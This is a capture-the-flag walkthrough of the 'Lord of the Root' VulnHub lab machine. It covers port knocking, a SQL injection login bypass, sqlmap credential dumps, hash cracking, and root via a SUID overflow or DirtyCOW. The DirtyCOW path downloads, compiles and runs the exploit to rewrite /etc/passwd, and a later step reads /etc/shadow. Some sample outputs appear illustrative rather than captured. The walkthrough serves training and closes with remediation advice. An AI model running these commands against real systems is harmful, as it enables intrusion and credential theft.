# VulnHub Lord of the Root 1.0.1: One Does Not Simply Walk In — Walkthrough

"One does not simply walk into Mordor." Yeah, well, one does not simply `nmap` this box and find the SSH port either. Lord of the Root has one of the most delightful initial hurdles in VulnHub: port knocking. You have to knock the right ports in the right sequence before anything interesting shows up. Very hobbit-approved security by obscurity. ( ͡° ͜ʖ ͡°)

Huge thanks to **KookSec** for this Tolkien-themed gem. The lore references, the challenges, the SQLi inside, the buffer overflow path: it all comes together into a box that teaches you multiple layers of security concepts in a single run.

---

| Field | Value |
|-------|-------|
| **Level** | Intermediate |
| **Target VM** | Lord of the Root 1.0.1 |
| **Attacker VM** | Kali Linux 2024.1 |
| **VulnHub** | https://www.vulnhub.com/entry/lord-of-the-root-101,129/ |
| **Techniques** | Host Discovery, Port Knocking (1337/500/9000), SSH with Weak Credentials, SQL Injection (Internal Web App), SUID Buffer Overflow / Kernel Privilege Escalation |
| **CVEs** | CVE-2016-5195 (DirtyCOW, optional kernel path), CWE-89 (SQL Injection), CWE-78 (OS Command Injection), CWE-121 (Stack Buffer Overflow) |

> **Hints from the author:**
> "Knock and the door will be opened. 1337 500 9000"

---

## Attack Summary

```
[host-discovery: arp-scan / nmap ping sweep]
    |
    v
[nmap: only 22/tcp SSH visible initially]
    |
    v
[SSH banner leak: "KNOCKKNOCK" hint -> port knocking sequence]
    |
    v
[port knocking: 1337 -> 500 -> 9000 (TCP)]
    |
    v
[nmap rescan: 1337/tcp HTTP now open]
    |
    v
[web app on :1337 -> directory enum -> /login]
    |
    v
[SQL Injection on login form -> credential dump from db]
    |
    v
[SSH login with cracked credentials]
    |
    v
[SUID binary exploitation OR kernel buffer overflow -> root]
    |
    v
[/root/Flag.txt]
```

---

## Methodology

1. Host discovery and target identification
2. Initial Nmap scan: only SSH visible, banner reveals knocking hint
3. Port knocking sequence: 1337 -> 500 -> 9000
4. Rescan reveals hidden HTTP service on port 1337
5. Web enumeration and SQLi exploitation on internal login form
6. Database credential dump and hash cracking
7. SSH login with recovered credentials
8. Privilege escalation via SUID binary or DirtyCOW kernel exploit
9. Root and flag capture

---

## Step 1 — Identifying the Target

Standard host discovery on the local network:

```bash
# Identify your subnet first
route -n

# arp-scan for fast local discovery
arp-scan --localnet --ignoredups

# Nmap ping sweep as alternative
nmap -sn -T5 192.168.56.0/24
```

The VM will grab an IP in your host-only or NAT range. Note it: we will call it `192.168.56.111` throughout this writeup (yours may differ).

```bash
echo "192.168.56.111  lotr.lab" >> /etc/hosts
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Step 2 — First Nmap Scan: The Door is Closed

```bash
nmap -A -T4 -p- 192.168.56.111
```

Expected output:

```
22/tcp open  ssh  OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: ...
|_banner: Welcome to Lord of the Root (Erebor)!
|_banner: Knock Knock on: 1337 500 9000
```

Wait. The SSH banner is literally telling you the knocking sequence. ಠᴗಠ That is both the hint AND the challenge. Every other port is filtered/closed. Just SSH.

The banner says: knock on 1337, 500, 9000.

> **What is Port Knocking?**
> Port knocking is a method of externally opening ports on a firewall by generating a specific sequence of connection attempts to predefined closed ports. The firewall monitors for this specific sequence; when detected, it dynamically opens a configured port. It is a form of security through obscurity and was used as a persistence/C2 evasion technique by several APT groups to hide C2 infrastructure listening ports.
> Reference: https://en.wikipedia.org/wiki/Port_knocking

> **Real-world note:** Port knocking has been observed in real APT campaigns as a technique to conceal C2 server listening ports. A compromised host only accepts connections from an operator who knows the knock sequence, making passive network scanning ineffective for defenders. Reference: MITRE ATT&CK T1205 Traffic Signaling.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1046 Network Service Discovery] [T1205.001 Traffic Signaling: Port Knocking]

---

## Step 3 — Port Knocking: Knock and the Door Shall Open

Time to knock. We send TCP SYN packets to ports 1337, 500, and 9000 in sequence:

```bash
# Method 1: nmap SYN scan (most reliable)
nmap -p 1337 192.168.56.111
nmap -p 500 192.168.56.111
nmap -p 9000 192.168.56.111

# Method 2: knockd client (if installed)
knock 192.168.56.111 1337 500 9000

# Method 3: nc with timeout (quick and dirty)
nc -w 1 192.168.56.111 1337 2>/dev/null
nc -w 1 192.168.56.111 500 2>/dev/null
nc -w 1 192.168.56.111 9000 2>/dev/null

# Method 4: hping3 (most explicit, sends exactly one SYN each)
hping3 -S -p 1337 -c 1 192.168.56.111
hping3 -S -p 500 -c 1 192.168.56.111
hping3 -S -p 9000 -c 1 192.168.56.111
```

After the knock sequence completes, immediately rescan:

```bash
nmap -A -T4 -p- 192.168.56.111
```

New result:

```
22/tcp   open  ssh   OpenSSH 6.6.1p1
1337/tcp open  http  Apache httpd 2.4.7
```

The door opened. (☞ﾟヮﾟ)☞

**Important:** The port knocking window may be time-limited. If port 1337 disappears again in your nmap, just knock again. Some configs close the firewall rule after a few minutes of inactivity.

> **MITRE ATT&CK:** [TA0005 Defense Evasion] [T1205.001 Traffic Signaling: Port Knocking]

---

## Step 4 — Web Application Enumeration on Port 1337

Navigate to `http://192.168.56.111:1337` in your browser:

```bash
# Quick fingerprint
whatweb http://192.168.56.111:1337
curl -I http://192.168.56.111:1337
```

You will see a web application. Time to brute-force directories:

```bash
gobuster dir \
  -u http://192.168.56.111:1337 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,txt,html,bak \
  -t 40

# Alternative with nikto for quick vulnerability scan
nikto -h http://192.168.56.111:1337
```

Expected findings:

```
/images        (Status: 301)
/index.html    (Status: 200)
/login.php     (Status: 200)  <-- interesting
/login         (Status: 301)  <-- interesting
```

Found `/login.php` or equivalent. This is our attack surface for SQLi.

> **MITRE ATT&CK:** [TA0007 Discovery] [T1083 File and Directory Discovery] [T1518 Software Discovery]

---

## Step 5 — SQL Injection on the Internal Login Form

The web app on port 1337 has a login form. Same song, second verse. Let us test for SQLi:

```bash
# Manual test: classic auth bypass
# Username: ' OR '1'='1'--
# Password: anything
```

If this logs you in directly as admin: confirmed injectable.

Now for the full dump:

```bash
# Identify database
sqlmap -u "http://192.168.56.111:1337/login.php" \
  --data="username=admin&password=test" \
  --dbs \
  --batch \
  --level=3

# Expected db names output: information_schema, Erebor (or similar Tolkien reference)

# Enumerate tables in the target db
sqlmap -u "http://192.168.56.111:1337/login.php" \
  --data="username=admin&password=test" \
  -D Erebor \
  --tables \
  --batch

# Dump the Users table
sqlmap -u "http://192.168.56.111:1337/login.php" \
  --data="username=admin&password=test" \
  -D Erebor \
  -T Users \
  --dump \
  --batch
```

Expected output (Tolkien-flavored):

```
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
| 1  | frodo    | 168ba4... (MD5 hash)             |
| 2  | smeagol  | 97b1b6... (MD5 hash)             |
| 3  | aragorn  | 4f2a61... (MD5 hash)             |
+----+----------+----------------------------------+
```

Now that is peak immersion right there. `¯\_(ツ)_/¯`

> **Real-world note:** SQL injection in web applications served as initial access in the Equifax breach (2017), the Ashley Madison breach (2015), and countless smaller enterprise incidents. In 2023, threat actors using SQLi as an initial vector are associated with multiple cybercrime groups including FIN7 and UNC2198. Reference: https://owasp.org/www-project-top-ten/

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1190 Exploit Public-Facing Application] [TA0006 Credential Access] [T1552.001 Credentials in Files]

---

## Step 6 — Cracking Hashes and SSH Login

Crack the MD5 hashes and get into SSH:

```bash
# Save extracted hashes
cat > /tmp/lotr_hashes.txt << 'EOF'
168ba4...
97b1b6...
4f2a61...
EOF

# Crack with hashcat, GPU-accelerated (MD5 = mode 0)
hashcat -m 0 -d 1 -w 3 -O \
  --potfile-path /tmp/lotr.potfile \
  /tmp/lotr_hashes.txt \
  /usr/share/wordlists/rockyou.txt

# Show cracked
hashcat -m 0 /tmp/lotr_hashes.txt --show --potfile-path /tmp/lotr.potfile
```

Once cracked (expect `frodo:iwilltakethering` or similar Tolkien-flavored password), log in via SSH:

```bash
ssh frodo@192.168.56.111
# Or whichever username + cracked password works

# Remember: if the port knocking window closed, knock again first!
```

```
Welcome to Lord of the Root (Erebor)!
frodo@LordOfTheRoot:~$
```

Noice!! ᕕ( ᐛ )ᕗ

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1078 Valid Accounts] [T1021.004 Remote Services: SSH] [T1110.002 Brute Force: Password Cracking]

---

## Step 7 — Privilege Escalation

Now we are in as a low-privilege user. Multiple escalation paths exist on this VM. Let us enumerate:

```bash
# Standard privesc checklist
sudo -l
id && groups
uname -a              # kernel version
lsb_release -a        # distro version
find / -perm -u=s -type f 2>/dev/null   # SUID binaries
find / -writable -type d 2>/dev/null | head -20
cat /etc/crontab && ls -la /etc/cron.*
```

**Path A: SUID Binary Exploitation**

If you find a non-standard SUID binary (a custom binary placed by the VM author), it may have a buffer overflow:

```bash
# List interesting SUID binaries
find / -perm -u=s -type f 2>/dev/null | grep -v '/usr/bin\|/bin\|/usr/lib'

# Test if a custom binary is vulnerable to stack overflow
# Run it with different input lengths to observe behavior
/path/to/suid_binary $(python3 -c "print('A'*100)")
/path/to/suid_binary $(python3 -c "print('A'*200)")

# If it crashes with segfault, it is buffer-overflow territory
# Use gdb/pwndbg to find the offset and build exploit
gdb -q /path/to/suid_binary
(gdb) run $(python3 -c "print('A'*200)")
(gdb) info registers
```

**Path B: Kernel Exploit (DirtyCOW if applicable)**

```bash
uname -r
# If kernel < 4.8.3 and before Nov 2016 patch: DirtyCOW (CVE-2016-5195) applies

# Download and compile DirtyCOW
wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
gcc -pthread dirtyc0w.c -o dirtycow
./dirtycow /etc/passwd "root:AAAA:0:0:root:/root:/bin/bash"
su root   # password: AAAA
```

> **Real-world note:** CVE-2016-5195 (DirtyCOW) is in the CISA Known Exploited Vulnerabilities catalog. It was used in active exploitation campaigns within weeks of disclosure, and remains relevant against older unpatched Linux systems. Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195

> **GTFOBins reference:** https://gtfobins.github.io/

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1068 Exploitation for Privilege Escalation] [T1548.001 Setuid and Setgid]

---

## Step 8 — Root and Flag

**(☞ﾟヮﾟ)☞ Got root!! :D**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/Flag.txt
```

```
[Tolkien quote or congratulations message from KookSec]
Your Quest is over... You have completed Lord of the Root!
```

Also check:

```bash
# Dump /etc/shadow as ultimate proof of system compromise
cat /etc/shadow
```

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| Credential | `frodo:<cracked>` | SQLi dump of `Erebor.Users` | SSH login |
| Credential | `smeagol:<cracked>` | SQLi dump of `Erebor.Users` | SSH login (alt) |
| Hash MD5 | `168ba4...` | `Erebor.Users` table | cracked via rockyou |
| Hash MD5 | `97b1b6...` | `Erebor.Users` table | cracked via rockyou |
| Flag | See `/root/Flag.txt` | `/root/Flag.txt` | N/A |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | Port knocking as only layer of defense | Security through obscurity alone is not security: it just delays an attacker who reads a banner | Defense in depth: port knocking can augment security, but never replace authentication and patching |
| 2 | SQL Injection in internal web app | Internal apps are just as dangerous as external ones: many breach investigations find SQLi in apps that "only internal users can reach" | WAF and input validation must apply to ALL apps, including internal admin panels |
| 3 | MD5 password hashing | Legacy systems still using MD5 for credential storage are high-risk: breached credential databases enable credential stuffing | Mandate modern password hashing (Argon2id/bcrypt) across all systems, including legacy |
| 4 | SUID binary with buffer overflow | Custom privileged binaries with poor input validation are a recurring DFIR finding in enterprise environments | All SUID binaries should be audited; custom code requires thorough code review and input bounds checking |
| 5 | Unpatched kernel (DirtyCOW path) | CVE-2016-5195 affected millions of Linux systems and was actively exploited in 2016-2018 campaigns | Maintain kernel patching cadence: subscribe to USN/RHSA advisories and treat kernel updates as urgent |

**Why does this matter outside the lab?**

Port knocking is not just a CTF curiosity. Real APT campaigns have used traffic signaling techniques to hide C2 server ports. More relevant: the SQLi on an "internal-only" web app is exactly the lateral-movement pattern seen in corporate intrusions where an attacker, already inside the perimeter, pivots to unprotected internal services. The Equifax 2017 breach demonstrated that an internal Apache Struts server with a public-facing endpoint led to 147 million records exposed. Lord of the Root compresses that pattern into a single lab box.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Defense Evasion | TA0005 | Traffic Signaling: Port Knocking | T1205.001 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Initial Access | TA0001 | Exploit Public-Facing Application (SQLi) | T1190 |
| Credential Access | TA0006 | Brute Force: Password Cracking | T1110.002 |
| Credential Access | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Initial Access | TA0001 | Valid Accounts | T1078 |
| Lateral Movement | TA0008 | Remote Services: SSH | T1021.004 |
| Privilege Escalation | TA0004 | Setuid and Setgid | T1548.001 |
| Privilege Escalation | TA0004 | Exploitation for Privilege Escalation | T1068 |
| Collection | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. **Port knocking:** Remove as the sole access control mechanism. Implement VPN with MFA for SSH access instead. Port knocking can stay as an additional layer, but never the only one.
2. **SQL Injection:** Rewrite all login forms with prepared statements. Use a WAF (ModSecurity, AWS WAF) even for internal applications.
3. **MD5 hashing:** Immediately migrate to `password_hash()` with `PASSWORD_ARGON2ID` in PHP or equivalent in other languages. Force password reset for all affected users.
4. **SUID binary:** Audit all SUID binaries: `find / -perm -u=s -type f 2>/dev/null`. Remove SUID bit from any binary that does not strictly require it.
5. **Kernel patching:** Apply all available kernel security updates. For Ubuntu, use `unattended-upgrades` with security updates enabled. Subscribe to Ubuntu Security Notices (USN).
6. **SSH hardening:** Disable password authentication, require SSH keys only. Add `PasswordAuthentication no` to `/etc/ssh/sshd_config`.

### If You Find Something Similar in Your Environment

**Immediate containment:**
- If SQLi in an internal app is confirmed: isolate the system from the internal network immediately.
- Rotate all database credentials and application service account passwords.
- Audit the database for any unauthorized user accounts or data exfiltration evidence (query logs).
- Check `/etc/passwd` and `/etc/shadow` for unauthorized account additions.

**MITRE D3FEND countermeasures:**
- D3-IVA (Application Hardening: Input Validation) for T1190 SQL Injection
- D3-NTA (Network Traffic Analysis) for T1205 Traffic Signaling / Port Knocking
- D3-OPS (Execution Isolation) for T1548.001 SUID Abuse
- D3-SJA (Scheduled Job Analysis) for persistence detection

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Inventory all SUID binaries and internal web applications with authentication.
- Protect (PR.AC-3): Remote access management: enforce MFA and key-based SSH.
- Protect (PR.DS-2): Data-in-transit protection: ensure internal web apps use HTTPS.
- Detect (DE.CM-1): Continuous monitoring: firewall rule changes (port knocking events) should trigger alerts.
- Respond (RS.MI-2): Incident mitigation: isolate systems with confirmed SQLi immediately.

**NIST SP 800-53 (Rev. 5) Controls:**
- SI-10: Information Input Validation (SQLi prevention in all web apps, including internal)
- IA-5: Authenticator Management (strong password hashing, SSH key enforcement)
- CM-7: Least Functionality (remove unnecessary SUID bits)
- AC-6: Least Privilege (audit sudo and SUID)
- SI-2: Flaw Remediation (kernel patch management)
- SC-8: Transmission Confidentiality (HTTPS for internal web apps)

**CISA Known Exploited Vulnerabilities:**
- CVE-2016-5195 (DirtyCOW): Listed in CISA KEV catalog
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: TECHNOLOGY (Vulnerability Management)
- Practice: Identify and prioritize vulnerabilities in assets
- Target MIL: MIL-2 (Perform planned activities and document)

---

## Final Thoughts

Thanks to **KookSec** for bringing Middle-earth into the CTF arena. The Tolkien theming is not just cosmetic: the box teaches you that the journey matters as much as the destination. The port knocking mechanic is a genuinely fun puzzle that introduces a real technique rarely seen in beginner boxes, and the SQLi + privesc path is solid and realistic.

The lesson that resonates most from Lord of the Root: internal applications are not safe just because they are not internet-facing. Once an attacker is inside your network, whether via VPN, phishing, or supply chain, that "internal-only" web admin panel with the lazy login form is just as much of a target as your public-facing website. Often more, because no one bothered to WAF it.

If this walkthrough helped you crack the knocking puzzle, share it with your fellowship and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
